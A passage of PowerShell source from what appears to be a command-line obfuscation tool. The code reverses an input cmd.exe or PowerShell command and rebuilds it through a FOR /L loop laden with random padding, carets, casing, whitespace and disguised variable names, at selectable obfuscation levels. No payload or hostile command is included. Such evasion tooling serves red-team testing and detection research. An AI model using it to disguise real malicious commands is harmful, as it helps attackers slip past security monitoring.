           
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomPadding,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { $_ -gt 0 } )]
        [System.Int16]
        $RandomPaddingFactor = 3,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript( { -not ($_ | where-object { (($_ -notmatch '^(.|\^[\^<>|&%])$')) -or (@('!','"') -contains $_) }) } )]
        [System.Object[]]
        $RandomPaddingCharArray = [System.String[]][System.Char[]] (@(32) + @(35..47) + @(58..64) + @(91..93) + @(95..96) + @(123..126) + @(48..57) + @(65..90) + @(97..122)),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace
    )

    # Create "profiles" depending on -ObfuscationLevel value and the length of the input -Command value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $StdIn              = $false
                $VFlag              = 'V:ON'
                $RandomCase         = $false
                $RandomSpace        = $false
                $RandomCaret        = $false
                $RandomChar         = $false
                $RandomPadding      = $false
                $VarNameSpecialChar = $false
                $VarNameWhitespace  = $false

                $CmdSyntax          = Get-Random -InputObject @('cmd','cmd.exe')
                $Cmd2Syntax         = Get-Random -InputObject @('cmd','cmd.exe')
                $PowerShellSyntax   = Get-Random -InputObject @('powershell','powershell.exe')
            }
            '2' {
                $StdIn                  = Get-Random -InputObject @($true,$false)
                $RandomCase             = $true
                $RandomSpace            = $true
                $RandomSpaceRange       = @(0..3)
                $RandomFlag             = $true
                $RandomCaret            = $true
                $RandomCaretPercent     = Get-Random -InputObject @(25..40)
                $RandomChar             = $true
                $RandomCharRange        = @(1..3)
                $RandomCharPercent      = Get-Random -InputObject @(25..40)
                $RandomCharArray        = Get-Random -InputObject @(@(','),@(';'))
                $RandomPadding          = $true
                $RandomPaddingFactor    = Get-Random -InputObject @(2..3)
                $RandomPaddingCharArray = [System.String[]][System.Char[]] (@(32) + @(48..57) + @(65..90) + @(97..122))
                $VarNameSpecialChar     = $false
                $VarNameWhitespace      = $false

                $CmdSyntax              = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax             = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax       = Get-ObfuscatedPowerShell -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
            '3' {
                # Randomly generate values for decoy strings and /V flag if not explicitly set (or if set to default values).
                if (-not $DecoyString1)
                {
                    $DecoyString1 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (-not $DecoyString2)
                {
                    $DecoyString2 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (@('V','V:','V:O','V:ON') -contains $Vflag)
                {
                    do
                    {
                        $vFlagTemp = 'V' + -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)) + @('~','!','@','#','$','*','(',')','-','_','+','=','{','}','[',']',':',';','?')) -Count (Get-Random -InputObject @(1..10)))
                    }
                    while (($vFlagTemp.Trim() -match '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -or ($vFlagTemp.Trim().ToLower().StartsWith('v:of')))
                    $VFlag = $vFlagTemp
                }

                $StdIn                  = $true
                $RandomCase             = $true
                $RandomSpace            = $true
                $RandomSpaceRange       = @(3..7)
                $RandomFlag             = $true
                $RandomCaret            = $true
                $RandomCaretPercent     = Get-Random -InputObject @(75..90)
                $RandomChar             = $true
                $RandomCharRange        = @(3..7)
                $RandomCharPercent      = Get-Random -InputObject @(75..90)
                $RandomCharArray        = @(',',';')
                $RandomPadding          = $true
                $RandomPaddingFactor    = Get-Random -InputObject @(5..10)
                $RandomPaddingCharArray = [System.String[]][System.Char[]] (@(32) + @(35..47) + @(58..64) + @(91..93) + @(95..96) + @(123..126) + @(48..57) + @(65..90) + @(97..122))
            
                if (Get-Random -InputObject @(0..1))
                {
                    $VarNameSpecialChar = $false
                    $VarNameWhitespace  = $true
                }
                else
                {            
                    $VarNameSpecialChar = $true
                    $VarNameWhitespace  = $false
                }

                # Override certain values for unusually large commands to try to remain under the 8,190 character limit of cmd.exe.
                if (($Command.Length -gt 150) -and ($Command.Length -le 500))
                {
                    $RandomCharPercent   = Get-Random -InputObject @(50..75)
                    $RandomCaretPercent  = Get-Random -InputObject @(50..75)
                    $RandomPaddingFactor = Get-Random -InputObject @(3..5)
                }
                elseif ($Command.Length -gt 500)
                {
                    $RandomSpaceRange    = @(2..5)
                    $RandomCaretPercent  = Get-Random -InputObject @(15..25)
                    $RandomCharRange     = @(2..5)
                    $RandomCharPercent   = Get-Random -InputObject @(15..25)
                    $RandomPaddingFactor = Get-Random -InputObject @(2..3)
                }

                $CmdSyntax        = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax       = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax = Get-ObfuscatedPowerShell -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
        }
    }

    # Set regex values to identify and replace the two single-alphanumeric character variables for the FOR loop at the end of this function if intricate syntax for $Cmd2Syntax or $PowerShellSyntax are used.
    $intricateForLoopRegex1 = '[\s\^\(,;]\%\^{0,1}[a-z0-9][\s\^\(,;]+I\^{0,1}N[\s\^,;]'
    $intricateForLoopRegex2 = 'D\^{0,1}O[\s\^\(,;]+\%\^{0,1}[a-z0-9]'

    # Check for intricate syntax (FOR LOOP) in input binary syntaxes.
    $intricateSyntaxRegex      = "$intricateForLoopRegex1.*$intricateForLoopRegex2"
    $intricateCmdSyntax        = $false
    $intricateCmd2Syntax       = $false
    $intricatePowerShellSyntax = $false
    if ($CmdSyntax -match $intricateSyntaxRegex)
    {
        $intricateCmdSyntax = $true
    }
    if ($Cmd2Syntax -match $intricateSyntaxRegex)
    {
        $intricateCmd2Syntax = $true
    }
    if ($PowerShellSyntax -match $intricateSyntaxRegex)
    {
        $intricatePowerShellSyntax = $true
    }
    
    # If using one of the more intricate PowerShell syntaxes that contain additional execution logic to retrieve the binary name then ensure that PowerShell commands are set to StdIn.
    if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent) -and $intricatePowerShellSyntax)
    {
        $StdIn = $true
    }

    # Check user-input $Command for uneven double quotes.
    if (Test-ContainsUnevenDoubleQuote -Command $Command)
    {
        return $null
    }

    # Remove any invalid tab characters from user-input $Command.
    if (-not ($Command = Remove-Tab -Command $Command))
    {
        return $null
    }
    
    # If user-input $Command contains characters that need escaping and no -FinalBinary has been selected then override to -FinalBinary 'cmd'.
    if (($FinalBinary -eq 'none') -and (Test-ContainsEscapableCharacter -Command $Command))
    {
        $FinalBinary = 'cmd'
    }

    # If cmd.exe-style environment variables are found in the user-input $Command then ensure that -StdIn is selected and -FinalBinary is not 'none'.
    # Try to rule out multiple instances of '%' in the command being used in the context of PowerShell (as an alias of the foreach-object cmdlet) and not and cmd.exe environment variable (e.g. PowerShell.exe <PS command> | % { <for each object do ___> })
    if (($Command -match '\%.*\%') -and ($Command -notmatch '( |\|)\%\s*{'))
    {
        # Set $StdIn to $true if it currently is not.
        if (-not $StdIn.IsPresent)
        {
            $StdIn = $true
        }

        # Set $FinalBinary to 'cmd' if it is not defined.
        if ($FinalBinary -eq 'none')
        {
            $FinalBinary = 'cmd'    
        }
    }

    # If -FinalBinary is 'cmd' and -StdIn is selected and user-input $Command contains an escapable character within a string then change -StdIn to $false due to escaping complexities.
    if (($FinalBinary -eq 'cmd') -and $StdIn.IsPresent -and (Test-ContainsEscapableCharacterInString -Command $Command))
    {
        $stdIn = $false
    }

    # Perform an additional layer of escaping specifically for PowerShell commands containing escapable characters within various string tokens.
    if ($FinalBinary -eq 'powershell')
    {
        $Command = Out-EscapedPowerShell -CommandToEscape $Command -StdIn:$StdIn
    }

    # Since the non-StdIn PowerShell command will be encapsulated by double quotes, we must escape any existing double quotes for the powershell.exe context with backslashes.
    if (-not $StdIn.IsPresent -and ($FinalBinary -eq 'powershell') -and $Command.Contains('"'))
    {
        $Command = $Command -replace '\\\"','\\"' -replace '\"','\"'
    }

    # Maintain array to ensure all randomly-generated variable names are unique per function invocation (and that single-character FOR loop variables do and unique leading characters maintained for any potential FOR loops in the command) to prevent variable name collisions.
    $script:varNameArray = @()

    # Maintain array to ensure all single-character FOR loop variable names do not collide with any additional randomly-generated variable names.
    $script:reservedUniqueFirstChars = @()
    
    # Define special characters that deserve extra escaping attention from a cmd.exe perspective.
    $charsToEscape = @('^','&','|','<','>')

    # Translate $Command into corresponding indexes of the characters in $reverseCommandCharsAsString.
    # If character is a special character in $charsToEscape then also include the previous index to capture the escape in the reassembled command.
    # Lastly, since we will be expanding the command in memory via cmd.exe's V/:ON option then when dealing with PowerShell commands not in the context of StdIn then we will avoid double-escaping by removing previously-add escapes from the earlier Out-EscapedPowerShell function call.
    if (-not $StdIn.IsPresent -and ($FinalBinary -eq 'powershell'))
    {
        $Command = ($Command -Split '\^{2}' | foreach-object { if ($_.Length -eq 0) {''} else {$_.Replace('^','')} }) -join '^'
    }

    # Reverse input command as character array.
    $reverseCommandChars = $Command[($Command.Length - 1)..0]
    
    # Join characters back into a single string to be set as a process-level environment variable in the final result.
    $reverseCommandCharsAsString = -join $reverseCommandChars

    # Perform necessary cmd.exe-level escaping of certain special characters.
    # The final command will require two layers of escaping, but in memory only one will be present.
    # We will now add the second layer of escaping since we have already generated the proper indexes for the payload for how it will appear in memory.
    # We will also track the length of the final command given this last layer of escaping which will be used by cmd.exe's substring functionality in the final process-level environment variable in the final command.
    $commandLength = $Command.Length
    foreach ($char in $charsToEscape)
    {
        # Add cmd.exe-level escaping (^) for all special characters, and increase the length of the total command if the payload is PowerShell and -StdIn is selected.
        if ($reverseCommandCharsAsString.Contains($char))
        {
            # Perform escaping.
            $reverseCommandCharsAsString = $reverseCommandCharsAsString.Replace($char,"^$char")

            if ($StdIn.IsPresent -and ($FinalBinary -ne 'powershell'))
            {
                # Track increased command length with escape characters that were added above. This is important for proper substringing for the final reassembled command.
                $commandLength = $commandLength + (($Command -split "\$char").Count - 1)
            }
        }
    }

    # Add cmd.exe's escape character of '^' AFTER escaped characters so it will correctly be added when the command is reassembled in reverse.
    if ((Test-ContainsEscapableCharacter -Command $Command) -and ($StdIn.IsPresent))
    {
        foreach ($char in $charsToEscape)
        {
            if ($reverseCommandCharsAsString.Contains("^$char") -and ($FinalBinary -ne 'powershell'))
            {
                # Add escaping AFTER the escaped char since the command is reversed and will be reassembled in reverse.
                $reverseCommandCharsAsString = $reverseCommandCharsAsString.Replace("^$char","^$char^^")

                # Track increased command length with escape characters that were added above. This is important for proper substringing for the final reassembled command.
                $commandLength = $commandLength + (($reverseCommandCharsAsString -split "\^\$char\^{2}").Count - 1)
            }
        }
    }

    # Continue performing padding substitutions as long as the padded result contains an unwanted cmd.exe-style environment variable syntax.
    $maxRetries   = 3
    $retryCounter = 0
    $reverseCommandCharsAsStringOriginal = $reverseCommandCharsAsString
    do
    {
        # Reset to original reversed command pre-padding (only matters if re-doing padding in this do-while loop).
        $reverseCommandCharsAsString = $reverseCommandCharsAsStringOriginal

        # Adjust final command length after above reversed escaping for final variable substring syntax.
        $commandLength = ($reverseCommandCharsAsString -split '\^[\^|&<>]' -join 'Z').Length

        # Set $commandIndexArray indexes to be the three-value syntax for the FOR /L loop syntax, taking into account strength length minus doubled up escaping in above step.
        $commandIndexArray = @(($commandLength - 1),-1,0)

        # Introduce random padding characters if -RandomPadding switch was selected.
        if ($RandomPadding.IsPresent)
        {
            # Escape any necessary characters in $RandomPaddingCharArray.
            for ($i = 0; $i -lt $RandomPaddingCharArray.Count; $i++)
            {
                if ($charsToEscape -contains $RandomPaddingCharArray[$i])
                {
                    $RandomPaddingCharArray[$i] = '^' + $RandomPaddingCharArray[$i]
                }
            }

            # If $RandomPadding switch is selected then adjust the FOR /L loop index values according to $RandomPaddingFactor.
            $commandIndexArray[0] += ($commandIndexArray[0] * $RandomPaddingFactor) + $RandomPaddingFactor
            $commandIndexArray[1] -= $RandomPaddingFactor
            $commandIndexArray[2] += $RandomPaddingFactor

            # Add in random padding characters without separating escaped characters and paired double quotes.
            $reverseCommandCharsAsStringWithPadding = ""

            for ($i = $reverseCommandCharsAsString.Length - 1; $i -ge 0; $i--)
            {
                # Retrieve current character and previous character (if it exists).
                $curChar = $reverseCommandCharsAsString[$i]
                $prevChar = $null
                if ($i -gt 0)
                {
                    $prevChar = $reverseCommandCharsAsString[$i - 1]
                }

                # Generate random padding value, increasing size of $RandomPaddingCharArray if necessary.
                while ($RandomPaddingFactor -gt $RandomPaddingCharArray.Count)
                {
                    $RandomPaddingCharArray += $RandomPaddingCharArray
                }
                $curPad = Get-Random -InputObject $RandomPaddingCharArray -Count $RandomPaddingFactor
            
                # If $curChar is an escaped special character then adjust $i index accordingly.
                $padAndCharToPrepend = $null
                if (($charsToEscape -contains $curChar) -and $prevChar -and ($prevChar -eq '^'))
                {
                    # Add prevChar to curChar since they are paired as escape characters.
                    $curChar = $prevChar + $curChar

                    # Adjust index $i to account for escape character.
                    $i--

                    # Set padding and current character(s) to prepend to $reverseCommandCharsAsStringWithPadding.
                    $padAndCharToPrepend = (-join $curPad) + $curChar
                }
                elseif (($curChar -eq '"') -and $prevChar -and ($prevChar -eq '"'))
                {
                    # Since $curChar is the end of adjacent paired double quotes then adjust padding size and $i index in addition to duplicating paired double quotes as much as necessary for proper reassembly.

                    # Add prevChar to curChar since they are paired as escape characters.
                    $curChar = $prevChar + $curChar

                    # Reduce $curPad by one to account for paired double quote.
                    if ($curPad.Count -eq 1)
                    {
                        $curPad = $null
                    }
                    else
                    {
                        $curPad = $curPad[0..($curPad.Count - 2)]
                    }

                    # Adjust index $i to account for escape character.
                    $i--

                    # Set padding and current character(s) to prepend to $reverseCommandCharsAsStringWithPadding.
                    # In the case of paired double quotes we have to play "leap-frog" to get both quotes to appear in final result.
                    $padAndCharToPrepend = (-join $curPad) + $curChar + (-join $curPad) + $curChar
                }
                else
                {
                    # Set padding and current character(s) to prepend to $reverseCommandCharsAsStringWithPadding.
                    $padAndCharToPrepend = (-join $curPad) + $curChar
                }

                # Prepend results onto $reverseCommandCharsAsStringWithPadding.
                $reverseCommandCharsAsStringWithPadding = $padAndCharToPrepend + $reverseCommandCharsAsStringWithPadding
            }

            # Set padded result back to $reverseCommandCharsAsString.
            $reverseCommandCharsAsString = $reverseCommandCharsAsStringWithPadding
        }

        $retryCounter++
    }
    while ( ($retryCounter -lt $maxRetries) -and (Get-ChildItem env:*).Name | where-object { $reverseCommandCharsAsString.ToLower().Contains("%$($_.ToString().ToLower())%") } )

    # Display warning (likely in the case where -RandomPadding is not selected) where maximum retries have been reached and reversed command still contains an unwanted environment variable.
    if ($retryCounter -ge $maxRetries)
    {
        $conflictingEnvVars = '%' + (( (Get-ChildItem env:*).Name | where-object { $reverseCommandCharsAsString.ToLower().Contains("%$($_.ToString().ToLower())%") } ) -join '%, %') + '%'

        Write-Warning "Reversed command contains a native cmd.exe-style environment variable. Try adding -RandomPadding to avoid this from resolving incorrectly on the command line. Conflicting environment variable(s): $conflictingEnvVars"
    }

    # Return index array as a single string with optional whitespace and comma obfuscation if corresponding options are selected.
    $commandIndexes = Out-ObfuscatedArray -CommandIndexArray $commandIndexArray -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $commandIndexes = Out-ObfuscatedCaret -StringToObfuscate $commandIndexes -RandomCaretPercent:$RandomCaretPercent
    }

    # Generate random variable name and create a SET command for $reverseCommandCharsAsString created above from user-input $Command.
    $setVarResults = Out-SetVarCommand -SubstringArray $reverseCommandCharsAsString -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace

    # Extract SET command syntax array and random variable name array.
    $setCommandArray    = $setVarResults[0]
    $setCommandVarArray = $setVarResults[1]

    # Generate unique, random variable name and set in two separate variables so we can add an optional replacement syntax to second usage of var name in special case with paired double quotes.
    $commandVarNameSet = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    $commandVarNameGet = $commandVarNameSet

    # Generate unique, random variable name to store the command as it is built character by character in each iteration of the FOR loop.
    $forLoopCommandVarName = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    
    # Generate unique, random variable name to store the FOR loop index placeholder variable.
    # Do not allow this variable name to be a substring of another existing variable as this will cause errors.
    # E.g. %4U% and %4% both being variables where %4% is the variable name for $forLoopIndexVarName will not decode correctly.
    # The -UniqueFirstChar switch for Get-RandomVarName will handle this logic.
    $forLoopIndexVarName = Get-RandomVarName -UniqueFirstChar

    # Randomly select positive or negative index value that will strip out the $forLoopCommandVarName variable name from its value for the final result.
    $finalSubstringIndex = Get-Random -InputObject (($forLoopCommandVarName.Length + 2),($commandLength * -1))
    
    # Add random space to tilda options below (but not the asterisk syntax).
    $randomSpaceA = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Randomly select positive or negative index value or asterisk syntax that will strip out the $forLoopCommandVarName variable name from its value for the final result.
    # Randomly add explicit '+' sign to positive index value option if -RandomChar is selected.
    $randomPlusSign = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        $randomPlusSign = '+'
    }
    $finalSubstringIndex  = @()
    $finalSubstringIndex += '~' + $randomSpaceA + $randomPlusSign + ($forLoopCommandVarName.Length + 2)
    $finalSubstringIndex += '~' + $randomSpaceA + ($commandLength * -1)
    $finalSubstringIndex += '*' + $forLoopCommandVarName + '!='
    
    # Randomly select option from above.
    $finalSubstringIndex = Get-Random -InputObject $finalSubstringIndex

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpace1 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpace1  = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }
    
    # Set necessary component values.
    $call   = 'call'
    $set    = 'set'
    $echo   = 'echo'
    $for    = 'for'
    $l      = 'L'
    $in     = 'in'
    $do     = 'do'
    $if     = 'if'
    $equ    = 'equ'
    $leq    = 'leq'
    $lss    = 'lss'
    $andAnd = '&&'
    $c1     = 'C'
    $c2     = 'C'
    $VFlag  = '/' + $VFlag.TrimStart('/') + $randomSpace1

    # Set random flag values if -RandomFlag switch is set.
    if ($RandomFlag.IsPresent)
    {
        # Randomly choose between /C and /R flags since these flags are interchangeable for compatibility reasons (per "cmd.exe /?").
        $c1 = (Get-Random -InputObject @($c1,'R'))
        $c2 = (Get-Random -InputObject @($c2,'R'))
    
        # 1:4 decide if using environment variable syntax for first character of flag value.
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c1 = (Out-EnvVarEncodedCommand -StringToEncode $c1.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c1.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c2 = (Out-EnvVarEncodedCommand -StringToEncode $c2.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c2.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $VFlag = (Out-EnvVarEncodedCommand -StringToEncode $VFlag.Substring(0,1) -EnvVarPercent (Get-Random -InputObject @(50..100)) -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $VFlag.Substring(1)
        }
    }

    # Set random case values if -RandomCase switch is set.
    if ($RandomCase.IsPresent)
    {
        $call   = Out-RandomCase $call
        $set    = Out-RandomCase $set
        $echo   = Out-RandomCase $echo
        $c1     = Out-RandomCase (Get-Random -InputObject @($c1,'R'))
        $c2     = Out-RandomCase (Get-Random -InputObject @($c2,'R'))
        $for    = Out-RandomCase $for
        $l      = Out-RandomCase $l
        $in     = Out-RandomCase $in
        $do     = Out-RandomCase $do
        $if     = Out-RandomCase $if
        $equ    = Out-RandomCase $equ
        $leq    = Out-RandomCase $leq
        $lss    = Out-RandomCase $lss
        $VFlag  = Out-RandomCase $VFlag
        $andAnd = Get-Random -InputObject @('&','&&')

        # Only randomize the case of $CmdSyntax, $Cmd2Syntax and $PowerShellSyntax if they do not have escapable characters (as some of the more intricate syntaxes containing escapable characters are case-sensitive).
        if (-not $intricateCmdSyntax)
        {
            $CmdSyntax = Out-RandomCase $CmdSyntax
        }
        if (-not $intricateCmd2Syntax)
        {
            $Cmd2Syntax = Out-RandomCase $Cmd2Syntax
        }
        if (-not $intricatePowerShellSyntax)
        {
            $PowerShellSyntax = Out-RandomCase $PowerShellSyntax
        }
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $call  = Out-ObfuscatedCaret -StringToObfuscate $call  -RandomCaretPercent:$RandomCaretPercent
        $set   = Out-ObfuscatedCaret -StringToObfuscate $set   -RandomCaretPercent:$RandomCaretPercent
        $echo  = Out-ObfuscatedCaret -StringToObfuscate $echo  -RandomCaretPercent:$RandomCaretPercent
        $for   = Out-ObfuscatedCaret -StringToObfuscate $for   -RandomCaretPercent:$RandomCaretPercent
        $l     = Out-ObfuscatedCaret -StringToObfuscate $l     -RandomCaretPercent:$RandomCaretPercent
        $in    = Out-ObfuscatedCaret -StringToObfuscate $in    -RandomCaretPercent:$RandomCaretPercent
        $do    = Out-ObfuscatedCaret -StringToObfuscate $do    -RandomCaretPercent:$RandomCaretPercent
        $if    = Out-ObfuscatedCaret -StringToObfuscate $if    -RandomCaretPercent:$RandomCaretPercent
        $equ   = Out-ObfuscatedCaret -StringToObfuscate $equ   -RandomCaretPercent:$RandomCaretPercent
        $leq   = Out-ObfuscatedCaret -StringToObfuscate $leq   -RandomCaretPercent:$RandomCaretPercent
        $lss   = Out-ObfuscatedCaret -StringToObfuscate $lss   -RandomCaretPercent:$RandomCaretPercent
        if ($c1 -notmatch '\%.*\:.*\%')
        {
            $c1 = Out-ObfuscatedCaret -StringToObfuscate $c1 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($c2 -notmatch '\%.*\:.*\%')
        {
            $c2 = Out-ObfuscatedCaret -StringToObfuscate $c2 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($VFlag -notmatch '\%.*\:.*\%')
        {
            $VFlag = Out-ObfuscatedCaret -StringToObfuscate $VFlag -RandomCaretPercent:$RandomCaretPercent
        }
    
        $commandVarNameSet     = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameSet     -RandomCaretPercent:$RandomCaretPercent
        $commandVarNameGet     = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameGet     -RandomCaretPercent:$RandomCaretPercent
        $forLoopCommandVarName = Out-ObfuscatedCaret -StringToObfuscate $forLoopCommandVarName -RandomCaretPercent:$RandomCaretPercent
        $forLoopIndexVarName   = Out-ObfuscatedCaret -StringToObfuscate $forLoopIndexVarName   -RandomCaretPercent:$RandomCaretPercent
        $finalSubstringIndex   = Out-ObfuscatedCaret -StringToObfuscate $finalSubstringIndex   -RandomCaretPercent:$RandomCaretPercent
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    $randomSpace4 = ''
    $randomSpace5 = ''
    $randomSpace6 = ''
    $randomSpace7 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace4 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace5 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace6 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace7 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomCharA  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharB  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar1  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
